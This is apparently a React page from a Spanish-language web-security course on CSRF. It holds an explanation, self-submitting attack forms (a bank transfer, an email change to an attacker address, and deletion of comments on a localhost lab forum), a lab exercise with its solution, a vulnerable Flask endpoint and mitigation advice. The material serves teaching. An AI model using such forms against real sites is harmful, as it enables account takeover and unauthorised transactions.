import React, { useState } from 'react';
import { useAuth } from '../context/AuthContext';
import './css/ModulePage.css';

import InteractiveTest from '../components/InteractiveTest';
import csrfQuestions from './questions';
import ModuleList from '../components/ModuleList';
import ModuleComments from '../components/ModuleComments';

function ModulePageCSRF() {
  const { user } = useAuth();

  const [showHint2, setShowHint2] = useState(false);
  const [showSolution2, setShowSolution2] = useState(false);
  const [showExample, setShowExample] = useState(false);
  const [showVideo, setShowVideo] = useState(false);

  return (
    <div className="ModulePage">
      <main className="ModuleContent">
        <h1 className="h1">Módulo 3: Cross-Site Request Forgery (CSRF)</h1>
        <p>
          <strong>Cross-Site Request Forgery (CSRF)</strong> es una vulnerabilidad que permite a un atacante realizar acciones en nombre de un usuario autenticado en una aplicación web, sin su consentimiento. 
          El atacante engaña al navegador de la víctima para que envíe peticiones no deseadas (como transferencias de dinero, cambios de contraseña o borrado de datos) usando la sesión activa del usuario.
        </p>
        <p>
          CSRF explota el hecho de que los navegadores envían automáticamente las cookies de sesión con cada petición al dominio correspondiente, sin importar desde dónde se originó la petición. 
          Si la aplicación no implementa mecanismos de protección, un atacante puede crear una página maliciosa que fuerce al navegador de la víctima a ejecutar acciones en la aplicación legítima.
        </p>
        <ul>
          <li><strong>Modificar la contraseña de un usuario:</strong> El atacante puede cambiar la contraseña de la víctima si la aplicación no protege el endpoint correspondiente.</li>
          <li><strong>Realizar transferencias de dinero:</strong> En aplicaciones bancarias, un CSRF puede transferir fondos sin el consentimiento del usuario.</li>
          <li><strong>Cambiar la dirección de correo electrónico:</strong> El atacante puede secuestrar cuentas cambiando el email asociado.</li>
          <li><strong>Borrar información:</strong> Puede eliminar datos personales, comentarios o archivos.</li>
        </ul>
        <p>
          <strong>¿Quieres saber más?</strong> Consulta estos recursos recomendados:
          <ul>
            <li>
              <a href="https://owasp.org/www-community/attacks/csrf" target="_blank" rel="noopener noreferrer">
                OWASP: Cross-Site Request Forgery (CSRF)
              </a>
            </li>
            <li>
              <a href="https://portswigger.net/web-security/csrf" target="_blank" rel="noopener noreferrer">
                PortSwigger Web Security Academy: CSRF
              </a>
            </li>
            <li>
              <a href="https://www.hacksplaining.com/exercises/csrf" target="_blank" rel="noopener noreferrer">
                Hacksplaining: Ejercicio interactivo de CSRF
              </a>
            </li>
            <li>
              <a href="https://developer.mozilla.org/es/docs/Web/Security/Types_of_attacks#cross-site_request_forgery_csrf" target="_blank" rel="noopener noreferrer">
                MDN Web Docs: CSRF
              </a>
            </li>
          </ul>
        </p>

        {/* Ejemplo en desplegable */}
        <section>
          <h2>Ejemplo</h2>
          <button onClick={() => setShowExample(e => !e)}>
            {showExample ? 'Ocultar ejemplo' : 'Mostrar ejemplo'}
          </button>
          {showExample && (
            <div className="example-details" style={{ marginTop: 14 }}>
              <p>
                <strong>Ejemplo 1: Transferencia bancaria</strong><br />
                Imagina que estás autenticado en tu banco online y visitas una página maliciosa. Esa página puede enviar una petición para transferir dinero usando tus credenciales, sin que te des cuenta.
              </p>
              <code className="sql-code">
                {`<form action="https://banco.com/transferir" method="POST">
  <input type="hidden" name="cantidad" value="1000">
  <input type="hidden" name="destino" value="cuenta_atacante">
  <input type="submit" value="Enviar">
</form>
<script>document.forms[0].submit()</script>`}
              </code>
              <p>
                Si la aplicación no protege contra CSRF, esta petición se procesará como si la hubiera realizado el usuario legítimo.
              </p>
              <hr />
              <p>
                <strong>Ejemplo 2: Cambio de email</strong><br />
                Un atacante puede crear una página que cambie el email de la víctima en una aplicación vulnerable:
              </p>
              <code className="sql-code">
                {`<form action="https://ejemplo.com/cambiar-email" method="POST">
  <input type="hidden" name="email" value="atacante@evil.com">
  <input type="submit" value="Cambiar email">
</form>
<script>document.forms[0].submit()</script>`}
              </code>
              <p>
                Si la víctima está autenticada, su email será cambiado sin que lo sepa.
              </p>
              <hr />
              <p>
                <strong>Ejemplo 3: Borrado de comentarios</strong><br />
                Un atacante puede forzar el borrado de un comentario en un foro vulnerable:
              </p>
              <code className="sql-code">
                {`<form action="http://localhost:5001/foro-borrar-comentario" method="POST">
  <input type="hidden" name="id" value="1">
  <input type="submit" value="Borrar">
</form>
<script>document.forms[0].submit()</script>`}
              </code>
              <p>
                Si la víctima está autenticada en el foro, el comentario con ID 1 será borrado.
              </p>
            </div>
          )}
        </section>

        {/* Vídeo en desplegable */}
        <section>
          <h2>Vídeo</h2>
          <button onClick={() => setShowVideo(v => !v)}>
            {showVideo ? 'Ocultar vídeo' : 'Mostrar vídeo'}
          </button>
          {showVideo && (
            <div className="video-container" style={{ marginTop: 14 }}>
              <iframe
                width="560"
                height="315"
                src="https://www.youtube.com/embed/vRBihr41JTo"
                title="YouTube video player"
                frameBorder="0"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowFullScreen
              ></iframe>
            </div>
          )}
        </section>

        {/* Test interactivo */}
        <section>
          <h2>Test teórico</h2>
          <InteractiveTest questions={csrfQuestions} />
        </section>

        {/* Ejercicio: Foro */}
        <section>
          <h2>Ejercicio: Explota CSRF para borrar comentarios en el foro</h2>
          <p>
            <strong>Contexto:</strong> Imagina que participas en un foro online. Puedes borrar tus propios comentarios desde la interfaz, pero la funcionalidad <b>no está protegida contra CSRF</b>.
            Un atacante podría engañarte para que, al visitar una web maliciosa mientras tienes la sesión iniciada, se envíe una petición para borrar uno de tus comentarios sin tu consentimiento.
          </p>
          <p>
            Accede al entorno vulnerable del foro y trata de explotar la vulnerabilidad para borrar un comentario tuyo mediante un ataque CSRF.
          </p>
          <button
            className="sandbox-button"
            style={{ marginTop: 12 }}
            onClick={() => window.open('/modulo/csrf/entorno-foro', '_blank')}
          >
            Abrir entorno vulnerable Foro
          </button>
          <div style={{ marginTop: 18 }}>
            <button className="hint-btn" onClick={() => setShowHint2(h => !h)}>
              {showHint2 ? 'Ocultar pista' : 'Mostrar pista'}
            </button>
            {showHint2 && (
              <div className="hint-box">
                <ul>
                  <li>Abre el entorno del foro y observa los IDs de los comentarios (se muestra como <code>ID: X</code> en cada comentario).</li>
                  <li>Crea un archivo HTML externo con un formulario que haga POST a <code>/foro-borrar-comentario</code> con el parámetro <code>id</code> del comentario que quieras borrar.</li>
                  <li>Abre ese archivo HTML en tu navegador mientras tienes la sesión iniciada en el foro.</li>
                </ul>
                <p>
                  Recuerda: el ataque CSRF se realiza desde una web externa, no desde el propio foro.
                </p>
              </div>
            )}
            <button className="hint-btn" onClick={() => setShowSolution2(s => !s)}>
              {showSolution2 ? 'Ocultar solución' : 'Mostrar solución'}
            </button>
            {showSolution2 && (
              <div className="hint-box solution-box">
                <b>¿Cómo realizar el ataque CSRF para borrar un comentario?</b>
                <ol>
                  <li>
                    Inicia sesión en el foro vulnerable y asegúrate de que puedes ver y publicar comentarios (esto establece la cookie de sesión en tu navegador).
                  </li>
                  <li>
                    Observa el <b>ID</b> del comentario que quieres borrar (se muestra como <code>ID: X</code> en cada comentario).
                  </li>
                  <li>
                    Crea un archivo HTML externo en tu ordenador con el siguiente contenido, cambiando el valor de <code>id</code> por el del comentario que quieras borrar:
                    <pre style={{ background: '#f7f7f7', padding: 8, borderRadius: 6 }}>
{String.raw`<form action="http://localhost:5001/foro-borrar-comentario" method="POST">
  <input type="hidden" name="id" value="1">
  <input type="submit" value="Borrar">
</form>
<script>document.forms[0].submit()</script>`}
                    </pre>
                  </li>
                  <li>
                    Abre ese archivo HTML en tu navegador (doble clic o arrástralo a una pestaña nueva) mientras tienes la sesión iniciada en el foro.
                  </li>
                  <li>
                    El comentario se borrará automáticamente si la aplicación es vulnerable a CSRF, ya que el navegador enviará la cookie de sesión junto con la petición POST.
                  </li>
                </ol>
                <b>Resumen:</b> El ataque no se realiza desde el propio foro, sino desde una web externa (el archivo HTML), simulando cómo un atacante podría forzar acciones en tu cuenta sin tu consentimiento.
              </div>
            )}
          </div>
        </section>

        {/* Acceso al entorno vulnerable */}
        <section>
          <h2>Acceso al entorno vulnerable</h2>
          <p>
            Pulsa el siguiente botón para abrir el foro vulnerable a CSRF en una nueva pestaña y realizar el ejercicio.
          </p>
          <button
            className="sandbox-button"
            style={{ marginTop: 12 }}
            onClick={() => window.open('/modulo/csrf/entorno-foro', '_blank')}
          >
            Abrir entorno vulnerable Foro
          </button>
          <div style={{ marginTop: 18 }}>
            <p style={{ marginBottom: 6, color: '#555', fontSize: '0.98rem' }}>
              ¿Quieres reiniciar los comentarios del foro? Puedes restaurar los comentarios originales con este botón.
            </p>
            <button
              className="sandbox-button"
              style={{ background: '#e53935', color: '#fff' }}
              onClick={async () => {
                await fetch('http://localhost:5001/foro-reset-comentarios', { method: 'POST' });
                window.alert('¡Comentarios restaurados!');
              }}
            >
              Reiniciar comentarios del foro
            </button>
          </div>
        </section>

        {/* Explicación técnica de la vulnerabilidad en un desplegable */}
        <details style={{ marginTop: 32 }}>
          <summary style={{ cursor: 'pointer', fontWeight: 600, fontSize: '1.08em' }}>
            ¿Por qué funciona la vulnerabilidad? (ver explicación técnica)
          </summary>
          <div style={{ marginTop: 16 }}>
            <p>
              La vulnerabilidad CSRF existe porque la aplicación no verifica que las peticiones POST realmente provienen del usuario legítimo.
              El backend confía en las cookies de sesión, pero no exige un token CSRF ni ninguna validación adicional.
            </p>
            <p>
              Por ejemplo, el backend vulnerable acepta cualquier petición POST a <code>/foro-borrar-comentario</code> con el parámetro <code>id</code> del comentario, y lo borra sin comprobar si la petición proviene realmente del usuario legítimo.
            </p>
            <pre style={{ background: '#f7f7f7', padding: 12, borderRadius: 8, fontSize: '0.97em', overflowX: 'auto' }}>
{String.raw`@app.route('/foro-borrar-comentario', methods=['POST'])
def foro_borrar_comentario():
    id_comentario = request.form.get('id')
    # ...borra el comentario con ese id...
    return jsonify({"success": True}), 200
`}
            </pre>
            <p>
              <strong>Solución:</strong> Para evitar CSRF, implementa tokens CSRF únicos por usuario y verifica su presencia en cada petición sensible. Además, puedes validar el encabezado <code>Origin</code> o <code>Referer</code> y usar SameSite cookies.
            </p>
          </div>
        </details>

        <ModuleComments moduleId="csrf" user={user} />

      </main>
      <ModuleList />
      <footer className="App-footer">
        <button className="sandbox-button">Sandbox</button>
      </footer>
    </div>
  );
}

export default ModulePageCSRF;